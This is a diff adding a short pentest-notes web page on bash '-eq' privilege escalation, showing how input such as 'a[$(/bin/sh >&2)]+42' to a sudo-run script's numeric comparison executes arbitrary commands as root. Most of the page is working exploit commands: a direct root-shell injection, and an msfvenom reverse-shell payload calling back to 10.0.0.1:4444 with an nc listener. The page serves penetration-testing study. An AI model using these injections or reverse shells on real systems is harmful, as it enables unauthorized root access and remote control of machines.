@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Bash eq Privilege Escalation - readloud.org</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Investigation", url: "#_top", children: [
+          ]},
+          {title: "Exploitation (Get a Shell Directly)", url: "#exploitation-get-a-shell-directly", children: [
+          ]},
+          {title: "Exploitation (Get a Shell Indirectly)", url: "#exploitation-get-a-shell-indirectly", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h2 id="investigation">Investigation</h2>
+<p>Please see <a href="https://www.vidarholen.net/contents/blog/?p=716">this post</a> for details.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>-l
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="o">(</span>root<span class="o">)</span><span class="w"> </span>/bin/bash<span class="w"> </span>/opt/example.sh
+</span></code></pre></div>
+<p>If we can execute above command as root, and the <strong><code>/opt/example.sh</code></strong> contains the numeric comparison such as <strong><code>[[ $var -eq 42 ]]</code></strong>, we can execute arbitrary command.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="ch">#!/bin/bash</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="nb">read</span><span class="w"> </span>-rp<span class="w"> </span><span class="s2">&quot;Enter guess: &quot;</span><span class="w"> </span>num
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span><span class="nv">$num</span><span class="w"> </span>-eq<span class="w"> </span><span class="m">42</span><span class="w"> </span><span class="o">]]</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="k">then</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Correct&quot;</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="k">else</span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Wrong&quot;</span>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="k">fi</span>
+</span></code></pre></div>
+<p>To execute arbitrary command, answer this question as below.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>sudo<span class="w"> </span>/bin/bash<span class="w"> </span>/opt/example.sh
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Enter<span class="w"> </span>guess:<span class="w"> </span>a<span class="o">[</span><span class="k">$(</span>date<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">2</span><span class="k">)</span><span class="o">]</span>+42
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>Sun<span class="w"> </span>Feb<span class="w">  </span><span class="m">4</span><span class="w"> </span><span class="m">19</span>:06:19<span class="w"> </span>PST<span class="w"> </span><span class="m">2018</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>Correct
+</span></code></pre></div>
+<p>inject arbitrary command before the correct number (<strong>42</strong>).</p>
+<p><br /></p>
+<h2 id="exploitation-get-a-shell-directly">Exploitation (Get a Shell Directly)</h2>
+<p>It’s easy if we can execute the bash script as root.<br />
+We only need to insert <strong><code>/bin/sh</code></strong> or <strong><code>/bin/bash</code></strong> command in the answer.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>sudo<span class="w"> </span>/bin/bash<span class="w"> </span>/opt/example.sh
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>Enter<span class="w"> </span>guess:<span class="w"> </span>a<span class="o">[</span><span class="k">$(</span>/bin/sh<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">2</span><span class="k">)</span><span class="o">]</span>+42
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>$
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="exploitation-get-a-shell-indirectly">Exploitation (Get a Shell Indirectly)</h2>
+<p>We can also inject a bash script and execute arbitrary code.<br />
+First, create a reverse shell script <strong><code>/tmp/shell.elf</code></strong> using <strong>msfvenom</strong>.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x64/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>-o<span class="w"> </span>/tmp/shell.elf
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/shell.elf
+</span></code></pre></div>
+<p>Then start a listener in local machine.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</span></code></pre></div>
+<p>Now execute the bash script as root.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>sudo<span class="w"> </span>/bin/bash<span class="w"> </span>/opt/example.sh
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>Enter<span class="w"> </span>guess:<span class="w"> </span>a<span class="o">[</span><span class="k">$(</span>/tmp/shell.elf<span class="k">)</span><span class="o">]</span>+42
+</span></code></pre></div>
+<p>We should get a root shell in local terminal.</p>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/os/linux/privilege-escalation/bash-eq-privilege-escalation.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
